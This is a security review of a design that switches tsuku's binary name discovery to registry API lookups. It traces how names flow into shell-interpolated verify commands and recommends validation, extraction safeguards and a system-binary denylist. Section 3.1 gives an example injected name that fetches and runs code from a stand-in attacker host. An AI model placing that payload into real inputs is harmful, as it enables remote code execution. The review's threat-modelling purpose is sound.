# Security Review: DESIGN-binary-name-discovery.md

## Review Scope

This review examines the security implications of replacing repository-based binary name discovery with registry API lookups and published artifact parsing, as described in `docs/designs/DESIGN-binary-name-discovery.md`.

The review covers: the existing attack surface of binary name handling, new attack vectors introduced by the design, adequacy of mitigations, residual risks, and evaluation of the design's "not applicable" justifications.

---

## 1. Threat Model Context

tsuku is a tool that downloads and executes binaries from the internet. The binary name discovery pipeline has a direct path to code execution:

```
Registry API response
  -> binary name extracted
  -> placed in recipe TOML (executables field)
  -> used to construct verify command (e.g., "tool --version")
  -> verify command interpolated into shell script (validate/executor.go:326)
  -> executed inside container (sandbox) or on host (tsuku verify)
```

A malicious or compromised registry response that injects a crafted binary name could, in theory, achieve command execution if the name bypasses validation.

---

## 2. Existing Security Controls (Pre-Design)

### 2.1 Input Validation at Builder Level

Each builder validates package names before API calls:
- **Cargo**: `isValidCrateName()` -- `^[a-zA-Z][a-zA-Z0-9_-]*$`, max 64 chars
- **npm**: `isValidNpmPackageNameForBuilder()` -- lowercase, scoped packages, rejects `..` and `\\`
- **PyPI**: `isValidPyPIPackageName()` -- `^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?$`, rejects `..`, `/`, `\\`, leading `-`
- **RubyGems**: `isValidGemName()` -- `^[a-zA-Z][a-zA-Z0-9_-]*$`, max 100 chars
- **Go**: `isValidGoModule()` -- domain/path format, rejects shell metacharacters, `..`, `//`

### 2.2 Executable Name Validation

`isValidExecutableName()` in `internal/builders/cargo.go:343`:
```
^[a-zA-Z0-9_][a-zA-Z0-9._-]*$
```
Max 255 chars. Applied to all binary names extracted from Cargo.toml `[[bin]]` sections, npm `bin` map keys, pyproject.toml scripts, and gemspec executables.

This regex blocks shell metacharacters (`;`, `$`, `` ` ``, `|`, `&`, `(`, `)`, `{`, `}`, `<`, `>`, `'`, `"`, spaces, newlines). The allowed set is: alphanumeric, underscores, dots, hyphens.

### 2.3 Verify Command Validation

Two layers:
1. **`validateDangerousPatterns()`** in `internal/recipe/validator.go:497` -- warns on `rm`, `eval`, `exec`, `$(`, `` ` ``, `||`, `&&`, pipe chains. These are warnings, not errors.
2. **`isValidVerifyCommand()`** in `internal/builders/homebrew.go:903` -- rejects `;`, `&&`, `||`, `|`, `` ` ``, `$`, `(`, `)`, `{`, `}`, `<`, `>`, newlines. This is used only by the Homebrew builder.

### 2.4 Execution Isolation

Verify commands run inside containers with:
- No network access (`--network none`)
- Resource limits (2GB memory, 2 CPUs, 100 PIDs)
- Read-only cache mount
- Separate `$TSUKU_HOME`

### 2.5 Action-Level Validation

`CargoInstallAction.Execute()` in `internal/actions/cargo_install.go:88-93` validates executables:
```go
for _, exe := range executables {
    if strings.Contains(exe, "/") || strings.Contains(exe, "\\") ||
        strings.Contains(exe, "..") || exe == "." || exe == "" {
        return fmt.Errorf(...)
    }
}
```
This is a weaker check than `isValidExecutableName()` -- it only catches path traversal, not shell metacharacters.

---

## 3. Attack Vector Analysis

### 3.1 Compromised crates.io `bin_names` Response (NEW VECTOR)

**Threat**: A compromised crates.io API (or MITM on HTTPS, or malicious crate author who somehow controls API responses) returns a `bin_names` array containing crafted values like `["$(curl evil.com/x|sh)"]`.

**Current mitigation**: `isValidExecutableName()` is applied to names from Cargo.toml parsing. The design proposes reading `bin_names` from the API instead.

**Gap**: The design does not explicitly state that `isValidExecutableName()` must be applied to names from the `bin_names` API field. The current code applies it when parsing Cargo.toml (cargo.go:325), but the replacement code path needs the same validation.

**Risk level**: LOW if implementation applies `isValidExecutableName()` to API-sourced names. The regex blocks all shell metacharacters. The risk is in the implementation forgetting this validation -- a code review concern, not a design flaw.

**Recommendation**: The design should explicitly state: "Binary names from `bin_names` must pass through `isValidExecutableName()` before use." Add this to the Security Considerations section.

### 3.2 Verify Command Shell Injection via Binary Name

**Threat**: A binary name that passes `isValidExecutableName()` but still causes problems when interpolated into a shell command.

**Analysis**: The verify command is constructed as `fmt.Sprintf("%s --version", executable)` or `fmt.Sprintf("cargo %s --version", subcommand)`. The command is then interpolated into a shell script at `validate/executor.go:326`:
```go
sb.WriteString(fmt.Sprintf("%s\n", r.Verify.Command))
```

This goes through `/bin/sh`. However, since `isValidExecutableName()` restricts to `^[a-zA-Z0-9_][a-zA-Z0-9._-]*$`, the resulting command would be something like `safe-name --version`. No shell metacharacters can exist in the executable name portion.

For `cargoVerifySection()`, the subcommand is derived by `strings.TrimPrefix(executable, "cargo-")`. If executable is `cargo-hack`, subcommand is `hack`, producing `cargo hack --version`. Since the original name already passed `isValidExecutableName()`, the subcommand inherits the same character restrictions.

**Risk level**: NEGLIGIBLE given current regex. The allowed character set cannot produce shell injection.

### 3.3 npm String-Type `bin` Field Fix

**Threat**: The design changes `parseBinField()` to return `[]string{packageName}` when `bin` is a string. If `packageName` contains injection characters, this becomes the executable name.

**Analysis**: The package name is validated by `isValidNpmPackageNameForBuilder()` which enforces lowercase alphanumeric with hyphens, dots, underscores, and optional scope prefix. Scoped packages (`@scope/tool`) have the scope stripped to produce the executable name. The scope stripping logic is described in the design but not yet implemented.

**Gap**: The design says "strip the scope prefix" for scoped packages but doesn't specify where. If the function returns `@scope/tool` as the executable name, the `/` and `@` characters would fail `isValidExecutableName()` validation downstream. But if `isValidExecutableName()` is not applied in this new code path, the `/` could cause path traversal in install actions.

**Risk level**: LOW. The npm package name regex already constrains the character set. But the scope stripping must happen before the name is used as an executable, and `isValidExecutableName()` must be applied to the result.

**Recommendation**: Design should specify: "For scoped packages, extract the unscoped name (e.g., `@scope/tool` becomes `tool`) and validate through `isValidExecutableName()` before using as an executable name."

### 3.4 PyPI/RubyGems Artifact Download (FUTURE WORK)

**Threat**: Downloading `.whl` and `.gem` artifacts for metadata extraction introduces a new download surface. A compromised registry could serve a malicious archive that exploits:
- Zip/tar extraction vulnerabilities (zip slip, symlink attacks, path traversal)
- Oversized files causing memory/disk exhaustion
- Unexpected file formats causing parser crashes

**Analysis**: The design mentions "HTTPS and verify content types" and "artifact sizes should be bounded." This is necessary but incomplete.

**Gaps identified**:
1. **Zip slip / path traversal**: `.whl` files are ZIP archives. Extracting `entry_points.txt` requires opening the archive and reading a specific file. If the code extracts to disk (rather than reading in-memory), malicious path entries could write outside the expected directory.
2. **Archive bomb**: A `.whl` could contain extremely compressed data. The `maxResponseSize` pattern limits the download size, but compressed-to-expanded ratio could still be problematic.
3. **Untrusted metadata parsing**: The design doesn't mention sanitizing data read from `entry_points.txt` or `metadata.gz`. Entry point names must pass through `isValidExecutableName()`.

**Risk level**: MEDIUM for future work. The attack surface is real but the work is explicitly deferred. The design's existing mention of HTTPS, content types, and size bounds covers the basics.

**Recommendations for the future work section**:
- Specify in-memory extraction only (no temp files) for metadata reading
- Apply `isValidExecutableName()` to all names extracted from artifacts
- Set a maximum number of entry points/executables per artifact (prevent DoS via thousands of entries)
- Consider verifying artifact hashes against registry-provided digests (PyPI provides SHA256 in the API response)

### 3.5 Orchestrator `ValidateBinaryNames()` Bypass

**Threat**: The design adds a validation step that corrects recipe executables when they don't match registry metadata. If this correction happens silently, a malicious registry response could inject arbitrary binary names into recipes.

**Analysis**: The correction replaces recipe executables with the "authoritative" registry names. This is the same data that the builder already used to generate the recipe. If the builder and orchestrator both trust the same registry, the correction is redundant in the normal case. The risk is when the orchestrator's registry data differs from the builder's (e.g., due to a race condition or cache inconsistency).

**Risk level**: LOW. The orchestrator validation is a safety net, not a new trust boundary. It uses the same registry data with the same validation applied.

### 3.6 Registry API Spoofing / Cache Poisoning

**Threat**: The design relies on registry APIs as the "authoritative source" for binary names. If a registry API is compromised or a CDN cache is poisoned, the binary names could be wrong or malicious.

**Analysis**: This is not a new risk introduced by the design -- the existing code already trusts crates.io for version resolution, PyPI for package metadata, etc. The `bin_names` field comes from the same API endpoint. The design correctly notes: "No new trust boundaries introduced."

**Risk level**: UNCHANGED from current baseline. The design does not expand the trust boundary.

### 3.7 TOCTOU Between Discovery and Installation

**Threat**: Binary names are discovered at recipe generation time. By the time the user runs `tsuku install`, the package may have been updated with different binaries. This is not specific to this design -- it exists today.

**Risk level**: UNCHANGED. The recipe captures a specific version, and `cargo install crate@version` will produce the same binaries.

---

## 4. Evaluation of Design's Security Considerations

### 4.1 "Download verification" -- ADEQUATE for Phase 1

The design correctly states no new downloads for crates.io and npm. For future PyPI/RubyGems work, the mention of HTTPS, content types, and size bounds is directionally correct but needs the additions noted in section 3.4.

### 4.2 "Execution isolation" -- NEEDS CLARIFICATION

The design states: "Binary names are strings used in recipe TOML, not executed directly during discovery."

This is true for the discovery phase, but binary names flow into verify commands that ARE executed. The statement is not wrong, but it understates the downstream impact. Binary names are not executed "during discovery" -- they are executed during validation and installation.

The existing `isValidExecutableName()` validation prevents this from being exploitable, but the design should acknowledge the full data flow: `bin_names` -> `executables` array -> `cargoVerifySection()` -> shell command in sandbox.

### 4.3 "Supply chain risks" -- ACCURATE

The design correctly identifies that no new trust boundaries are introduced. The `bin_names` field comes from the same endpoint.

### 4.4 "User data exposure" -- ACCURATE

No change to user data handling.

---

## 5. "Not Applicable" Justification Review

The design doesn't explicitly mark anything as "not applicable," but implicitly treats several areas as out of scope:

### 5.1 Verify command injection -- IMPLICITLY DISMISSED, JUSTIFIED

The design doesn't discuss verify command injection because binary names pass through `isValidExecutableName()`. This is justified -- the regex is a strong control. But the design should make this explicit rather than leaving it as an unstated assumption.

### 5.2 Registry availability / denial of service -- CORRECTLY OUT OF SCOPE

If crates.io is down, recipe generation fails. This is an availability issue, not a security issue. Correctly not discussed.

### 5.3 Dependency confusion / typosquatting -- CORRECTLY OUT OF SCOPE

A user requesting `tsuku create sqlx-cll` (typo) is not in scope for binary name discovery. The user chose the package. Correctly not discussed.

---

## 6. Missing Attack Vectors

### 6.1 Binary Name Collision / Shadowing

**Not discussed in design**: If a crate's `bin_names` field contains a name like `ls`, `curl`, `sh`, or `cargo`, installing it would shadow system binaries in `$TSUKU_HOME/bin`. This is not an injection attack -- it's a legitimate binary name that happens to collide.

**Impact**: If tsuku's bin directory is early in PATH, a malicious crate could replace `curl` with a binary that exfiltrates data. This is not specific to this design (the existing Cargo.toml parsing has the same risk), but the switch to `bin_names` doesn't add any defense against it either.

**Recommendation**: Consider adding a denylist of system binary names that recipes cannot shadow (`sh`, `bash`, `env`, `curl`, `wget`, `sudo`, etc.). This is a separate concern from this design but worth noting as a gap in the broader system.

### 6.2 Excessive Binary Count from `bin_names`

**Not discussed in design**: A crate could declare hundreds of binaries in its `bin_names` field. The design doesn't mention bounding the number of executables extracted from the API response.

**Impact**: Mostly a DoS concern (slowing recipe generation, bloating recipe files). Not a command execution risk.

**Recommendation**: Add a reasonable upper bound (e.g., 50 executables) and warn or error if exceeded.

### 6.3 Unicode / Homoglyph Binary Names

**Not discussed**: The `isValidExecutableName()` regex allows only ASCII characters (`[a-zA-Z0-9._-]`), which blocks Unicode homoglyph attacks. The crates.io API should only return ASCII names (crate names are ASCII-only), but it's worth noting this is mitigated by the existing regex.

**Risk level**: NEGLIGIBLE due to existing regex.

---

## 7. Residual Risk Assessment

### Risks to Escalate

1. **Missing `isValidExecutableName()` on new code paths**: The biggest implementation risk. If the `bin_names` field values or the npm scoped-package-derived names bypass `isValidExecutableName()`, they flow unvalidated into shell commands. The design should make validation requirements explicit.

   **Severity**: Implementation detail, but the consequence of getting it wrong is shell injection in the sandbox (contained) or during `tsuku verify` on the host (not contained).

2. **Verify command interpolation into shell scripts**: At `validate/executor.go:326`, the verify command is interpolated directly into a shell script without quoting. This is currently safe because verify commands are constructed from validated executable names. But it's a fragile property -- any future builder that constructs verify commands from less-validated inputs could introduce injection.

   **Severity**: Not directly caused by this design, but this design adds a new source of data (API response) that feeds into this path. Worth noting as a systemic risk.

### Risks That Are Acceptable

1. **Registry trust**: Trusting crates.io/npm/PyPI/RubyGems for metadata is inherent to tsuku's design. This design doesn't change the trust model.

2. **TOCTOU between generation and installation**: The recipe captures a specific version. Binary names are stable for a given version.

3. **Sandbox escape**: Even if a verify command were somehow malicious, it runs in a container with no network, limited resources, and a separate filesystem. Container escape is a general container security concern, not specific to this design.

---

## 8. Summary of Recommendations

### Must-Have (Before Implementation)

1. **Explicit validation requirement**: Add to the design's Security Considerations: "All binary names extracted from registry APIs (`bin_names` for crates.io, `bin` for npm) or published artifacts (future PyPI/RubyGems work) must pass through `isValidExecutableName()` before being used in recipes. This prevents shell metacharacter injection in verify commands and path traversal in installation actions."

2. **Scope stripping for npm**: Specify that scoped package names must have the scope stripped and the result validated before use as an executable name.

### Should-Have (Implementation Phase)

3. **Bound executable count**: Add a maximum number of executables per package (e.g., 50) to prevent DoS via API manipulation.

4. **Artifact extraction safety** (for future PyPI/RubyGems work): Specify in-memory-only archive reading, hash verification against registry digests, and `isValidExecutableName()` for all extracted names.

### Nice-to-Have (Systemic Improvements)

5. **System binary denylist**: Consider adding a check that recipe executables don't shadow critical system binaries.

6. **Verify command construction hardening**: Consider moving verify command execution from shell interpolation (`sb.WriteString(fmt.Sprintf("%s\n", r.Verify.Command))`) to `exec.Command()` with argument splitting. This would eliminate the shell injection vector entirely, regardless of what the verify command contains. This is a larger change outside the scope of this design.
